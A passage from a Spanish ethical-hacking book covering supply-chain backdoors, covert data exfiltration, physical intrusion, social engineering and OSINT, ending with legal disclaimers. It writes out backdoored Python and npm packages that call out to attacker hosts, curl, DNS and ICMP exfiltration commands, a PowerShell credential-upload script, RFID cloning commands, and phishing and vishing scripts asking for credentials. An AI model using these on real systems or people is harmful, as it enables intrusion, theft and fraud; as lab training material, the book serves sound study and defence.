Simularemos un ataque en el que un paquete Python usado por un proyecto leg√≠timo es modificado para incluir un backdoor.

1. **Paquete original** (`mathutils.py`):

```python
def suma(a, b):
    return a + b
```

2. **Paquete comprometido**:

```python
import requests
import threading

def backdoor():
    datos = "Host comprometido"
    requests.post("http://192.168.1.10:8080/log", data={"info": datos})

threading.Thread(target=backdoor).start()

def suma(a, b):
    return a + b
```

3. Reemplazar el paquete original en la carpeta del proyecto.
4. Cuando el software se ejecute, adem√°s de sumar, enviar√° informaci√≥n al atacante.

---

## 24.4. Escenario de Laboratorio ‚Äì Hardware

Simular alteraci√≥n de firmware en un router:

* Descargar firmware oficial.
* Modificar scripts internos.
* Volver a flashear el dispositivo.
* En laboratorio, esto puede hacerse con un firmware de OpenWRT modificado.

---

## 24.5. Escenario de Laboratorio ‚Äì Inyecci√≥n en Pipeline CI/CD

1. Configurar un proyecto en GitLab con pipeline automatizado.
2. Inyectar script malicioso en etapa de build:

```yaml
build:
  script:
    - echo "Malware activo" >> /tmp/log.txt
```

3. Todo software compilado contendr√° la modificaci√≥n.

---

## 24.6. Ejemplo Completo de Backdoor en Librer√≠a NPM

1. Crear paquete leg√≠timo:

```javascript
module.exports = function suma(a, b) {
    return a + b;
};
```

2. Insertar c√≥digo malicioso:

```javascript
const https = require('https');
https.get('https://attacker.local/capture?host=' + require('os').hostname());

module.exports = function suma(a, b) {
    return a + b;
};
```

3. Publicar paquete en repositorio interno comprometido.

---

## 24.7. Persistencia y Evasi√≥n

* Usar **ofuscaci√≥n** para esconder el c√≥digo malicioso.
* Firmar digitalmente binarios modificados para evitar sospechas.
* Propagarse a trav√©s de actualizaciones autom√°ticas.

---

## 24.8. Ejercicio Pr√°ctico Completo

1. Crear un proyecto Python que dependa de un paquete externo.
2. Comprometer el paquete a√±adiendo un script de exfiltraci√≥n.
3. Configurar servidor Flask para recibir datos.
4. Instalar paquete comprometido y verificar env√≠o de informaci√≥n.
5. Implementar detecci√≥n con an√°lisis de dependencias (`pip-audit`).

---

## 24.9. Detecci√≥n

* **Analizar dependencias** con herramientas como `npm audit`, `pip-audit`.
* Verificar **integridad** con hashes y firmas digitales.
* Revisar logs de compilaci√≥n y ejecuci√≥n en pipelines CI/CD.
* Escanear firmware con herramientas de an√°lisis est√°tico.

---

## 24.10. Contramedidas

* Uso estricto de **firmas digitales** en software y actualizaciones.
* Auditor√≠a peri√≥dica de c√≥digo y dependencias.
* Aislamiento de entornos de compilaci√≥n.
* Verificaci√≥n de integridad en hardware recibido.

---

## 24.11. Cierre

Los ataques a la cadena de suministro son de los m√°s devastadores porque se infiltran en software o hardware antes de que llegue al usuario.
En laboratorio, reproducirlos ayuda a entender c√≥mo detectarlos antes de que lleguen a producci√≥n.

---

üí° **TIP Black-Hat √âtico:** cuando controlas la fuente, controlas el flujo; la prevenci√≥n empieza en el primer eslab√≥n.

---


# **Cap√≠tulo 25 ‚Äì Exfiltraci√≥n de Datos Encubierta**

*Sacando informaci√≥n sin levantar alarmas*

---

## 25.1. Introducci√≥n

La **exfiltraci√≥n de datos encubierta** es el proceso de sacar informaci√≥n de un sistema comprometido evitando ser detectado por sistemas de seguridad como **DLP** (Data Loss Prevention), IDS/IPS o EDR.
En operaciones de pentesting avanzado, es el paso final de la **kill chain**: ya tienes acceso, ahora hay que mover los datos fuera sin disparar alarmas.

T√©cnicas clave:

* Camuflaje en tr√°fico leg√≠timo.
* Compresi√≥n y cifrado antes de la extracci√≥n.
* Uso de canales alternativos (DNS, ICMP, HTTP/S).

En ataques reales, grupos APT suelen usar m√©todos como **DNS tunneling**, esteganograf√≠a en im√°genes o tr√°fico cifrado TLS hacia servidores C2.

---

## 25.2. Preparaci√≥n del Laboratorio

| Recurso               | Uso                                                          |
| --------------------- | ------------------------------------------------------------ |
| Kali Linux            | M√°quina atacante y servidor de recepci√≥n.                    |
| Windows/Linux v√≠ctima | Sistema desde el que se exfiltran datos.                     |
| Herramientas          | `dnscat2`, `iodine`, `pingtunnel`, `curl`, Python, steghide. |
| Conectividad          | Red controlada para simular tr√°fico leg√≠timo.                |

---

## 25.3. Proceso General de Exfiltraci√≥n

1. **Identificaci√≥n de datos**: saber qu√© extraer.
2. **Compresi√≥n**: reducir tama√±o.
3. **Cifrado**: proteger el contenido.
4. **Encapsulado**: camuflarlo en un canal permitido.
5. **Extracci√≥n**: enviarlo al atacante.
6. **Eliminaci√≥n de rastros**: borrar archivos temporales y logs.

---

## 25.4. M√©todo 1 ‚Äì Exfiltraci√≥n v√≠a HTTP(S)

```bash
tar czf - datos/ | openssl enc -aes-256-cbc -k clave | curl -X POST --data-binary @- https://192.168.1.10/upload
```

En el servidor (Flask):

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    with open("datos.tar.enc", "wb") as f:
        f.write(request.data)
    return "OK"

app.run(host="0.0.0.0", port=443, ssl_context=('cert.pem', 'key.pem'))
```

HTTP/S se confunde con tr√°fico web leg√≠timo.

---

## 25.5. M√©todo 2 ‚Äì DNS Tunneling

Usar `iodine` o `dnscat2` para encapsular datos en consultas DNS.
En Kali:

```bash
dnscat2-server secret.com
```

En v√≠ctima:

```bash
dnscat2 secret.com
```

El tr√°fico parece peticiones DNS normales.

---

## 25.6. M√©todo 3 ‚Äì ICMP (Ping) Tunneling

En atacante:

```bash
pingtunnel -type server -listen 0.0.0.0:8080
```

En v√≠ctima:

```bash
pingtunnel -type client -l 127.0.0.1:8080 -s 192.168.1.10
```

Los datos se transmiten como paquetes ICMP, que suelen estar permitidos.

---

## 25.7. M√©todo 4 ‚Äì Esteganograf√≠a

Ocultar datos dentro de im√°genes:

```bash
steghide embed -cf imagen.jpg -ef datos.txt -p clave123
```

Extraer:

```bash
steghide extract -sf imagen.jpg -p clave123
```

Luego, la imagen se sube a redes sociales o se env√≠a por email sin levantar sospechas.

---

## 25.8. M√©todo 5 ‚Äì Canales en Servicios Cloud

Subir archivos cifrados a servicios como Dropbox, Google Drive o AWS S3 usando sus APIs.
Ejemplo con Python y Dropbox:

```python
import dropbox
dbx = dropbox.Dropbox('TOKEN')
with open("datos.enc", "rb") as f:
    dbx.files_upload(f.read(), '/datos.enc')
```

---

## 25.9. Ejercicio Pr√°ctico Completo

1. Preparar carpeta con datos de prueba.
2. Cifrarlos con OpenSSL.
3. Exfiltrar v√≠a:

   * HTTP/S con servidor Flask.
   * DNS tunneling con `dnscat2`.
   * Esteganograf√≠a con `steghide`.
4. Detectar el tr√°fico con Wireshark y documentar patrones.

---

## 25.10. Detecci√≥n

* An√°lisis de tr√°fico an√≥malo (volumen o destinos raros).
* Monitoreo de DNS para detectar consultas largas y extra√±as.
* Detecci√≥n de archivos con alta entrop√≠a (indicador de cifrado).
* Revisi√≥n de logs de subida a servicios cloud no autorizados.

---

## 25.11. Contramedidas

* **DLP** bien configurado para bloquear datos sensibles.
* **Bloqueo de protocolos no necesarios** como ICMP saliente.
* **Inspecci√≥n profunda de paquetes (DPI)**.
* Restricci√≥n y auditor√≠a de uso de servicios cloud.

---

## 25.12. Cierre

La exfiltraci√≥n de datos es la fase final de un ataque exitoso, y en un pentest bien hecho, es el momento m√°s cr√≠tico para evaluar si la organizaci√≥n puede detectar y frenar la p√©rdida de informaci√≥n.

---

üí° **TIP Black-Hat √âtico:** un dato fuera es como un barco que zarpa: si no lo detienes en el puerto, se pierde en el mar.

---


# **Cap√≠tulo 26 ‚Äì Hacking F√≠sico y Seguridad de Acceso**

*Comprometiendo el mundo f√≠sico para abrir puertas digitales*

---

## 26.1. Introducci√≥n

El **hacking f√≠sico** es el conjunto de t√©cnicas utilizadas para acceder a un entorno protegido comprometiendo las barreras f√≠sicas que lo resguardan.
En ciberseguridad ofensiva, a menudo es el **punto de entrada inicial** cuando las defensas digitales son fuertes pero la seguridad f√≠sica es d√©bil.
Ejemplos reales incluyen:

* Apertura de cerraduras mec√°nicas y electr√≥nicas.
* Uso de tarjetas clonadas para acceso.
* Manipulaci√≥n de sensores y sistemas de control de acceso.
* ‚ÄúEvil Maid Attacks‚Äù: comprometer dispositivos dejados sin vigilancia.

> ‚ö† Todo lo que se describe aqu√≠ es √∫nicamente para fines educativos y de pentesting autorizado.

---

## 26.2. Tipos de Objetivos en Hacking F√≠sico

| Tipo de objetivo          | Ejemplos                       | Riesgos                 |
| ------------------------- | ------------------------------ | ----------------------- |
| Cerraduras mec√°nicas      | Candados, cerraduras de tambor | Apertura no autorizada  |
| Cerraduras electr√≥nicas   | RFID, NFC, teclado num√©rico    | Clonado o bypass        |
| Sistemas biom√©tricos      | Huella, iris, rostro           | Suplantaci√≥n biom√©trica |
| Dispositivos desatendidos | Laptops, servidores, routers   | Robo de datos           |

---

## 26.3. Herramientas B√°sicas de Laboratorio

* Juego de ganz√∫as y extractores de llaves.
* Lector/grabador RFID/NFC (Proxmark3, ACR122U).
* Kits de apertura de cerraduras electr√≥nicas.
* Raspberry Pi o ESP32 para ataques f√≠sicos IoT.
* Destornilladores, pinzas, lupas y herramientas de apertura no destructiva.

---

## 26.4. Ataques a Cerraduras Mec√°nicas

**Ganz√∫as**: m√©todo tradicional para manipular pines internos.
Laboratorio:

1. Usar candado de pr√°ctica transparente.
2. Identificar pines y tensar cilindro.
3. Manipular pines hasta abrir.

---

## 26.5. Ataques a Cerraduras Electr√≥nicas RFID/NFC

Ejemplo con **Proxmark3**:

1. Leer tarjeta:

```bash
pm3 --> lf search
```

2. Clonar tarjeta:

```bash
pm3 --> lf clone --id 12345678
```

3. Grabar en tarjeta en blanco y probar acceso.

---

## 26.6. Ataques a Sistemas de Teclado Num√©rico

* **Shoulder surfing**: observar c√≥digos desde distancia.
* **Residuo t√©rmico**: usar c√°mara t√©rmica para ver qu√© teclas se presionaron.
* **Brute force f√≠sico**: si el sistema no limita intentos.

---

## 26.7. Ataques a Sistemas Biom√©tricos

* **Huella**: replicar con l√°tex o silicona usando una huella en vidrio.
* **Rostro**: foto impresa o pantalla mostrando video (si no hay detecci√≥n de vida).
* **Iris**: imagen de alta resoluci√≥n y lente de contacto.

---

## 26.8. Ataques a Dispositivos Desatendidos

* **Evil Maid Attack**:

  1. Localizar laptop sin vigilancia.
  2. Insertar USB con payload (Rubber Ducky).
  3. Ejecutar script de robo de credenciales:

```powershell
$pass = Get-Content C:\credenciales.txt
Invoke-WebRequest -Uri http://192.168.1.10/upload -Method POST -Body $pass
```

* **Cold Boot Attack**: leer RAM inmediatamente despu√©s de apagar el equipo.

---

## 26.9. Ejemplo Completo de Laboratorio ‚Äì Clonaci√≥n RFID

1. Configurar Proxmark3 en Kali.
2. Leer tarjeta MIFARE de laboratorio:

```bash
pm3 --> hf mf rdbl 0 A FFFFFFFFFFFF
```

3. Guardar datos y escribir en tarjeta en blanco.
4. Probar acceso en lector de pruebas.

---

## 26.10. Persistencia F√≠sica

* Instalar microc√°maras ocultas para registrar c√≥digos.
* Colocar dispositivos de ‚Äúkey capture‚Äù en teclados f√≠sicos.
* Insertar hardware esp√≠a en puertos USB.

---

## 26.11. Detecci√≥n y Contramedidas

* Revisi√≥n peri√≥dica de cerraduras y lectores.
* Uso de **RFID/NFC cifrados** con autenticaci√≥n mutua.
* Habilitar **detecci√≥n de vida** en biometr√≠a.
* Limitar intentos de c√≥digo y habilitar alertas.
* Auditor√≠as f√≠sicas y pentesting f√≠sico recurrente.

---

## 26.12. Cierre

El hacking f√≠sico recuerda que, aunque protejas tu red con firewalls y cifrado, una cerradura barata o un descuido f√≠sico pueden derribar todo tu esfuerzo.

---

üí° **TIP Black-Hat √âtico:** un firewall no sirve si el atacante puede abrir la puerta y conectar un cable.

---


# **Cap√≠tulo 27 ‚Äì Ingenier√≠a Social Avanzada**

*El arte de hackear la mente antes de hackear el sistema*

---

## 27.1. Introducci√≥n

La **ingenier√≠a social** es el uso de la manipulaci√≥n psicol√≥gica para influir en personas y lograr que revelen informaci√≥n o realicen acciones que comprometan la seguridad.
En operaciones ofensivas autorizadas, la ingenier√≠a social es la herramienta m√°s poderosa, porque la debilidad m√°s com√∫n no est√° en el software, sino en **el factor humano**.

En ataques reales, los hackers combinan **OSINT (Open Source Intelligence)** con t√°cticas de persuasi√≥n para:

* Robar credenciales.
* Obtener acceso f√≠sico.
* Comprometer sistemas de forma indirecta.

---

## 27.2. Principios Psicol√≥gicos Fundamentales

Extra√≠dos del trabajo de Robert Cialdini y otros expertos:

| Principio               | Descripci√≥n                                         | Ejemplo                                                                          |
| ----------------------- | --------------------------------------------------- | -------------------------------------------------------------------------------- |
| Reciprocidad            | Las personas sienten obligaci√≥n de devolver favores | ‚ÄúTe paso este informe gratis, ¬øme puedes dar acceso a los datos para validarlo?‚Äù |
| Autoridad               | Las personas obedecen a figuras de poder            | Suplantar a un jefe de √°rea                                                      |
| Escasez                 | Lo raro o limitado aumenta su valor                 | ‚ÄúEsta clave solo es v√°lida por unas horas‚Äù                                       |
| Aprobaci√≥n social       | Las personas imitan conductas de otros              | ‚ÄúTodos en el equipo ya han activado esto‚Äù                                        |
| Simpat√≠a                | La gente coopera m√°s con personas que les caen bien | Coincidir en gustos o intereses                                                  |
| Compromiso y coherencia | Cumplir con lo que ya se acept√≥                     | ‚ÄúYa me diste acceso a la intranet, solo falta este permiso‚Äù                      |

---

## 27.3. Preparaci√≥n de un Ataque de Ingenier√≠a Social

1. **OSINT**: recopilar informaci√≥n sobre el objetivo (redes sociales, comunicados de prensa, foros).
2. **Perfilado**: identificar roles clave y puntos de contacto.
3. **Pretexting**: crear una historia o identidad cre√≠ble.
4. **Medio de contacto**: email, tel√©fono, redes sociales o en persona.
5. **Ejecuci√≥n**: aplicar t√©cnica elegida.
6. **Cierre y borrado de huellas**.

---

## 27.4. Ejemplo de OSINT Automatizado

```bash
theHarvester -d empresa.com -l 500 -b google
```

Este comando obtiene correos, subdominios y datos p√∫blicos para preparar un ataque.

---

## 27.5. T√©cnicas de Ingenier√≠a Social Avanzada

### a) **Phishing de Alta Precisi√≥n (Spear Phishing)**

* Emails personalizados usando datos reales de la v√≠ctima.
* Plantillas que imitan al 100% la interfaz de servicios leg√≠timos.
  Ejemplo con **SET (Social Engineering Toolkit)**:

```bash
setoolkit
# Opci√≥n 1: Social-Engineering Attacks
# Opci√≥n 2: Website Attack Vectors
# Opci√≥n 3: Credential Harvester
```

### b) **Vishing (Voice Phishing)**

* Llamadas fingiendo ser soporte t√©cnico.
* Uso de VoIP para mostrar n√∫mero confiable (caller ID spoofing).

### c) **Smishing**

* Env√≠o de SMS con enlaces maliciosos.
* Camuflaje usando dominios similares a los reales.

### d) **Pretexting F√≠sico**

* Entrar a instalaciones simulando ser t√©cnico de mantenimiento.
* Llevar uniforme y herramientas para ganar credibilidad.

---

## 27.6. Escenario de Laboratorio ‚Äì Spear Phishing

1. Recolectar datos de empleados en LinkedIn.
2. Redactar correo dirigido al CFO con un pretexto cre√≠ble:

```
Asunto: Factura pendiente ‚Äì URGENTE
Cuerpo: Estimado Sr. P√©rez, detectamos un error en el pago del proveedor X. Necesitamos que acceda al portal para confirmar la informaci√≥n:
[Enlace malicioso]
```

3. Servidor en Kali con `SET` para capturar credenciales.

---

## 27.7. Escenario de Laboratorio ‚Äì Pretexting Telef√≥nico

* Preparar guion:

```
Hola, hablo del √°rea de IT de [Empresa]. Estamos actualizando el sistema de VPN y necesitamos confirmar sus credenciales para migrarlo.
```

* Usar softphone con caller ID falso (`Asterisk` con `SIP.conf` modificado).

---

## 27.8. Ejercicio Pr√°ctico Completo

1. Elegir empresa ficticia.
2. Hacer OSINT de empleados, tel√©fonos y estructura interna.
3. Crear tres ataques distintos:

   * Email spear phishing.
   * Llamada de vishing.
   * Entrada f√≠sica con pretexto.
4. Documentar resultados y tasa de √©xito.

---

## 27.9. Detecci√≥n y Prevenci√≥n

* **Capacitaci√≥n continua** en ingenier√≠a social.
* **Simulacros internos** de phishing y vishing.
* **Pol√≠ticas estrictas** para manejo de credenciales.
* Verificaci√≥n fuera de banda para solicitudes sensibles.

---

## 27.10. Cierre

La ingenier√≠a social es la prueba definitiva de que **la seguridad no depende solo de la tecnolog√≠a**. Un atacante que maneja bien la psicolog√≠a puede abrir m√°s puertas que un exploit sofisticado.

---

üí° **TIP Black-Hat √âtico:** antes de hackear un servidor, aprende a hackear la mente que lo administra.

---


# **Cap√≠tulo 28 ‚Äì OSINT Avanzado**

*Inteligencia de fuentes abiertas para la caza digital*

---

## 28.1. Introducci√≥n

**OSINT** (Open Source Intelligence) es la recopilaci√≥n y an√°lisis de informaci√≥n p√∫blica para generar inteligencia accionable.
En un pentest o en una operaci√≥n ofensiva real, el OSINT sirve para:

* Identificar vulnerabilidades humanas y t√©cnicas.
* Mapear la infraestructura de un objetivo.
* Encontrar puntos de entrada indirectos.

A diferencia de un simple ‚Äúbuscar en Google‚Äù, el OSINT avanzado implica **automatizar**, **correlacionar** y **verificar** la informaci√≥n para obtener un perfil completo del objetivo.

> ‚ö† El OSINT es legal mientras no se traspasen barreras de autenticaci√≥n o se usen m√©todos intrusivos sin autorizaci√≥n.

---

## 28.2. Ciclo de OSINT

1. **Definir objetivo**: qu√© se busca y para qu√©.
2. **Recopilar**: fuentes abiertas, herramientas y t√©cnicas.
3. **Procesar**: filtrar, limpiar y organizar datos.
4. **Analizar**: encontrar patrones, conexiones y vulnerabilidades.
5. **Producir inteligencia**: conclusiones listas para actuar.
6. **Difundir**: reportar hallazgos a quien corresponda.

---

## 28.3. Fuentes de OSINT

| Categor√≠a                       | Ejemplos                                 |
| ------------------------------- | ---------------------------------------- |
| **Motores de b√∫squeda**         | Google, Bing, Yandex, DuckDuckGo         |
| **Redes sociales**              | LinkedIn, Facebook, Twitter/X, Instagram |
| **Registros p√∫blicos**          | WHOIS, bases de datos gubernamentales    |
| **Foros y deep web**            | Pastebin, foros underground              |
| **Repositorios de c√≥digo**      | GitHub, GitLab                           |
| **Metadatos**                   | Fotos, documentos PDF, im√°genes en redes |
| **An√°lisis de infraestructura** | Shodan, Censys, ZoomEye                  |

---

## 28.4. Herramientas de OSINT Avanzado

* **theHarvester** ‚Äì Emails, dominios y subdominios.
* **Maltego** ‚Äì Visualizaci√≥n y relaciones.
* **SpiderFoot** ‚Äì OSINT automatizado.
* **Recon-ng** ‚Äì Framework modular.
* **Shodan/Censys** ‚Äì Escaneo de dispositivos expuestos.
* **Exiftool** ‚Äì Extracci√≥n de metadatos.

---

## 28.5. Ejemplo de B√∫squeda Avanzada en Google (Google Dorks)

```text
site:empresa.com filetype:pdf
site:empresa.com intitle:"index of"
"confidential" filetype:xls
```

Estos comandos permiten localizar informaci√≥n sensible publicada sin intenci√≥n.

---

## 28.6. Ejemplo con theHarvester

```bash
theHarvester -d empresa.com -l 500 -b google,bing,linkedin
```

Obtiene correos, subdominios y datos de contacto para ingenier√≠a social o mapeo de red.

---

## 28.7. Ejemplo con Shodan

Buscar c√°maras IP expuestas:

```bash
shodan search "port:554 has_screenshot:true"
```

Buscar servidores con puertos RDP abiertos:

```bash
shodan search "port:3389 org:\"Empresa\""
```

---

## 28.8. OSINT en Redes Sociales

* Uso de **Maltego** para mapear conexiones entre empleados.
* An√°lisis de publicaciones para detectar:

  * Ubicaciones recurrentes.
  * Fechas de vacaciones.
  * Tecnolog√≠a usada en la empresa.
* Herramientas como **Social-Searcher** o **Sherlock** para encontrar perfiles por nombre de usuario.

---

## 28.9. Extracci√≥n de Metadatos

Con `exiftool`:

```bash
exiftool imagen.jpg
```

Esto puede revelar:

* Modelo de c√°mara/tel√©fono.
* Coordenadas GPS.
* Fecha y hora exactas.

---

## 28.10. Ejercicio Pr√°ctico Completo

1. Definir objetivo ficticio: `empresa-demo.com`.
2. Usar **theHarvester** para obtener correos.
3. Usar **Shodan** para mapear dispositivos expuestos.
4. Descargar im√°genes p√∫blicas y extraer metadatos.
5. Correlacionar datos en **Maltego**.
6. Crear informe con:

   * Mapa de relaciones humanas.
   * Lista de activos tecnol√≥gicos expuestos.
   * Potenciales vulnerabilidades.

---

## 28.11. Detecci√≥n y Prevenci√≥n

* Revisar qu√© informaci√≥n est√° disponible p√∫blicamente.
* Configurar pol√≠ticas para empleados sobre redes sociales.
* Monitorear con herramientas como **SpiderFoot HX** para detectar filtraciones.
* Usar WAF y segmentaci√≥n de servicios expuestos.

---

## 28.12. Cierre

El OSINT avanzado convierte datos dispersos en inteligencia precisa. En un pentest, es la base para dise√±ar ataques quir√∫rgicos con m√≠nima exposici√≥n y m√°xima efectividad.

---

üí° **TIP Black-Hat √âtico:** la informaci√≥n m√°s peligrosa que un atacante usa contra ti, muchas veces, la publicaste t√∫ mismo.

---


# **Cap√≠tulo 29 ‚Äì Cierre, Despedida y Declaraci√≥n Final**

*Reflexiones finales, responsabilidad y el verdadero sentido del hacking √©tico*

---

## 29.1. El viaje que hemos hecho juntos

A lo largo de este libro, hemos recorrido t√©cnicas, herramientas y t√°cticas que, en manos equivocadas, podr√≠an causar da√±os inmensos. Desde los ataques m√°s b√°sicos de reconocimiento hasta las t√©cnicas m√°s agresivas de explotaci√≥n, exfiltraci√≥n y persistencia, hemos visto **c√≥mo operan los atacantes reales** y, m√°s importante, **c√≥mo detectar, prevenir y mitigar esas acciones**.

Si llegaste hasta aqu√≠, ya no eres la misma persona que empez√≥ este viaje:

* Sabes c√≥mo se piensa, se prepara y se ejecuta una operaci√≥n ofensiva.
* Conoces las vulnerabilidades m√°s comunes en redes, sistemas, aplicaciones y personas.
* Puedes construir entornos de laboratorio para recrear escenarios realistas sin poner en riesgo sistemas reales.

---

## 29.2. El prop√≥sito de este libro

Este no es un manual para ‚Äúhackear por diversi√≥n‚Äù ni un cat√°logo para delinquir.
El prop√≥sito central es **educar y entrenar** para que las personas encargadas de la seguridad inform√°tica puedan **ponerse en la piel de un atacante** y as√≠ anticipar, reforzar y blindar sus sistemas.

La **Biblia Negra del Ethical Hacking** quiere ser una herramienta para:

* Profesionales de ciberseguridad que buscan llevar sus habilidades al siguiente nivel.
* Equipos de respuesta a incidentes que necesitan entender las t√©cnicas del adversario.
* Investigadores y entusiastas que quieren aprender de manera controlada y √©tica.

---

## 29.3. Importancia del laboratorio controlado

Todo lo que hemos practicado debe ejecutarse en **entornos cerrados y aislados**, como:

* M√°quinas virtuales en redes internas sin acceso a Internet.
* Servidores vulnerables creados para pruebas, como Metasploitable o DVWA.
* Redes privadas controladas por el pentester o la organizaci√≥n que contrata la auditor√≠a.

Un entorno de laboratorio:

* **Previene da√±os colaterales**.
* Evita comprometer sistemas de terceros.
* Permite repetir las pruebas sin consecuencias legales.

---

## 29.4. Declaraci√≥n y responsabilidad legal

‚ö† **DECLARACI√ìN LEGAL IMPORTANTE:**
El autor de este libro, el editor y cualquier persona asociada **NO se hacen responsables** de las acciones que el lector pueda realizar fuera del contexto legal y autorizado.
Aplicar cualquiera de las t√©cnicas explicadas en sistemas o redes que no sean de tu propiedad, o sin el consentimiento expl√≠cito del propietario, es **ILEGAL** en la mayor√≠a de pa√≠ses y puede resultar en:

* Multas muy elevadas.
* Penas de prisi√≥n.
* Inhabilitaci√≥n profesional.
* Da√±os irreparables a tu reputaci√≥n.

---

## 29.5. Hacking √©tico vs. hacking criminal

La diferencia entre un hacker √©tico y uno criminal **no est√° en la t√©cnica, sino en el contexto y la intenci√≥n**.

* Un hacker √©tico tiene **autorizaci√≥n por escrito**, documenta cada paso y reporta sus hallazgos.
* Un hacker criminal oculta su identidad, no busca consentimiento y persigue fines personales o destructivos.

En un pentest, tu trabajo es **ser el atacante, pero con contrato y l√≠mites claros**.

---

## 29.6. La mentalidad correcta

Un buen pentester:

* Piensa como atacante.
* Act√∫a como profesional.
* Aprende siempre, pero respeta la ley.
* Comparte conocimientos para fortalecer la comunidad de ciberseguridad.

Recuerda: **la curiosidad no es excusa para la ilegalidad**.

---

## 29.7. Recomendaciones para seguir aprendiendo

* Practicar en plataformas como Hack The Box, TryHackMe, VulnHub.
* Mantenerse actualizado en exploits, parches y CVEs.
* Participar en CTFs (Capture The Flag) para mejorar habilidades ofensivas y defensivas.
* Seguir investigando en OSINT, ingenier√≠a inversa, malware y respuesta a incidentes.

---

## 29.8. El lado humano de la ciberseguridad

M√°s all√° del c√≥digo y los exploits, la ciberseguridad es un trabajo que **protege vidas, datos y recursos**.
Un ataque puede:

* Robar identidades.
* Afectar hospitales.
* Poner en riesgo infraestructuras cr√≠ticas.

Por eso, entender el ‚Äúlado oscuro‚Äù es una responsabilidad que debe asumirse con **madurez √©tica**.

---

## 29.9. Mensaje final del autor

Querido lector:
Este libro no es el final de un camino, sino el inicio de una responsabilidad. Ahora que conoces las armas, tu tarea es **ser un guardi√°n, no un depredador**.
Cada exploit que aprendas debe ir acompa√±ado de una pregunta:

> ‚Äú¬øC√≥mo puedo usar esto para proteger, no para destruir?‚Äù

Si alguna vez dudas sobre la legalidad o moralidad de una acci√≥n, detente y eval√∫a. El conocimiento te hace poderoso, pero el autocontrol te hace profesional.

---

## 29.10. **DISCLAIMER EXTENDIDO**

* **Todo** el contenido aqu√≠ descrito debe ejecutarse √∫nicamente en entornos de laboratorio controlados.
* **Nunca** ataques sistemas en producci√≥n o redes ajenas sin autorizaci√≥n escrita.
* Este libro tiene un **fin exclusivamente educativo** para ense√±ar c√≥mo piensan y operan los delincuentes, y as√≠ dise√±ar mejores defensas.
* El uso indebido de esta informaci√≥n es responsabilidad √∫nica del lector.

---

üí° **TIP Final Black-Hat √âtico:**
Un hacker sin √©tica es un delincuente.
Un hacker con √©tica es un escudo invisible que protege en silencio.

---


# **Ep√≠logo**

*Para quienes caminan entre la luz y la sombra*

---

Cuando iniciamos este recorrido, sab√≠as que no ser√≠a un camino f√°cil. La seguridad ofensiva, cuando se estudia con profundidad, exige m√°s que solo conocimiento t√©cnico: pide paciencia, disciplina y una mente capaz de mirar donde otros no miran.

Hemos explorado t√©cnicas que, mal utilizadas, pueden destruir. Hemos visto el poder que tiene una simple l√≠nea de c√≥digo, una conexi√≥n mal asegurada o una palabra dicha en el momento preciso. Y tambi√©n hemos entendido que la diferencia entre ser un **creador** y un **destructor** radica en un detalle invisible: **tu intenci√≥n**.

El verdadero hacker √©tico vive en una frontera constante. No es un santo ni un criminal, sino alguien que conoce la oscuridad para defender la luz. La curiosidad lo gu√≠a, pero la √©tica lo detiene donde otros cruzar√≠an sin pensar.

Este libro no pretende convertirte en un ‚Äúexperto en romper cosas‚Äù, sino en un **arquitecto de seguridad**, en un observador paciente que sabe anticipar los movimientos de un adversario porque ya los ha ensayado cien veces en su laboratorio.

Recuerda que **la seguridad no es un estado, es un proceso**. No hay sistemas invulnerables, solo defensas lo suficientemente fuertes como para disuadir a un atacante‚Ä¶ o para hacerlo fracasar antes de que cause da√±o.

En el mundo real, nunca sabr√°s cu√°ntos ataques detuviste. Quiz√° nadie te d√© las gracias, porque las mejores victorias son invisibles. Pero t√∫ sabr√°s, en silencio, que estuviste ah√≠, que detectaste, que preveniste, que protegiste.

Y eso, amigo lector, es el mayor reconocimiento que puede recibir un profesional de la ciberseguridad:
**ser un guardi√°n an√≥nimo, un centinela que nunca duerme.**

---

**Dedicatoria Final:**
A todos los que creen que el conocimiento es un arma y, aun as√≠, deciden usarlo como un escudo.
A los que protegen sin que nadie lo sepa.
A quienes eligen ser parte de la soluci√≥n, aunque sea m√°s tentador ser parte del problema.

---

üí° **Reflexi√≥n final:**
El d√≠a que uses todo lo aprendido para salvar a alguien de un desastre digital, entender√°s que este libro no era un manual de ataque, sino un juramento silencioso de defensa.

---

### Alejandro G Vera, Experto Universitario enn Ethical Hacking (UTN)

## ¬øQuieres el PDF? [`La_biblia_negra_del_Ethical_Hacking.pdf`](La_biblia_negra_del_Ethical_Hacking.pdf)









